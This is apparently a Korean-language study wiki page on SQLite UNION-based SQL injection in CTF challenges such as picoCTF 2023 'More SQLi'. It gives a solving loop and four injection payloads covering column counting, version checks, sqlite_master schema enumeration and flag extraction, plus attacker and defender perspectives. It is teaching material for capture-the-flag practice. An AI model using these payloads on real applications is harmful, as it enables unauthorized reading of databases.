---
title: SQLite UNION-based SQLi — CTF patterns
created: 2026-06-15
updated: 2026-06-15
type: concept
tags: [ctf, web, sqli, sqlite, union-based-sqli, sql-injection]
sources: [https://siunam321.github.io/ctf/picoCTF-2023/Web-Exploitation/More-SQLi/, https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Web%20Exploitation/More%20SQLi/More-SQLi.md]
confidence: high
---

# SQLite UNION-based SQLi — CTF patterns

## 1. 정의
**SQLite UNION-based SQLi**는 SQLite 기반 애플리케이션에서 `UNION SELECT`를 이용해 원래 쿼리 결과에 추가 행을 덧붙이고, `sqlite_master` 같은 메타 테이블을 통해 스키마를 열거하는 패턴입니다.

## 2. 쉬운 비유
원래는 한 장짜리 출력물만 보게 되어 있는데, 공격자가 **다른 문서를 옆에 끼워 넣는 것**에 가깝습니다. SQLite에서는 그 문서가 `UNION SELECT`이고, 색인 목록이 `sqlite_master`입니다.

## 3. 자주 보이는 단서
| 단서 | 의미 |
|------|------|
| 검색 결과가 테이블 형태로 보임 | UNION 컬럼 수 맞추기 가능성 |
| 에러 메시지 없이 결과가 일부만 바뀜 | UNION 성공 가능성 |
| `sqlite_version()`이 먹힘 | SQLite 확인 |
| `sqlite_master`를 조회할 수 있음 | 스키마 열거 가능 |
| `more_table`, `flag` 같은 숨은 테이블 | 최종 데이터 추출 지점 |

## 4. 기본 풀이 루프
```text
1) 컬럼 수를 추정합니다.
2) NULL로 UNION이 되는지 확인합니다.
3) sqlite_version()으로 SQLite인지 확인합니다.
4) sqlite_master에서 테이블 정의를 읽습니다.
5) flag가 있는 테이블의 컬럼을 직접 조회합니다.
```

## 5. 자주 쓰는 payload
```sql
-- 컬럼 수 맞추기
' UNION ALL SELECT NULL, NULL, NULL-- -
```

```sql
-- SQLite 확인
' UNION ALL SELECT sqlite_version(), NULL, NULL-- -
```

```sql
-- 메타데이터 열거
' UNION SELECT sql, NULL, NULL FROM sqlite_master-- -
```

```sql
-- 관심 테이블에서 flag 추출
' UNION SELECT id, flag, NULL FROM more_table-- -
```

## 6. 공격자 관점
1. 먼저 출력 컬럼 수를 확인합니다.
2. `NULL`과 문자열을 섞어 데이터 타입을 맞춥니다.
3. `sqlite_master`로 table / column 이름을 확보합니다.
4. 숨은 테이블에서 flag 컬럼을 직접 읽습니다.

## 7. 방어자 관점
- 모든 입력에 prepared statement를 사용합니다.
- 검색 기능도 로그인과 동일한 수준으로 검증합니다.
- SQLite 메타데이터를 직접 노출하지 않도록 에러 메시지를 줄입니다.
- 숨은 테이블에 민감 정보를 저장하지 않습니다.

## 8. 같이 보면 좋은 페이지
- [[more-sqli-final-writeup]]
- [[sql-injection]]
- [[sqlite-sqli-filter-bypass-ctf-patterns]]
- [[web-gauntlet-2-final-writeup]]
- [[web-gauntlet-3-final-writeup]]
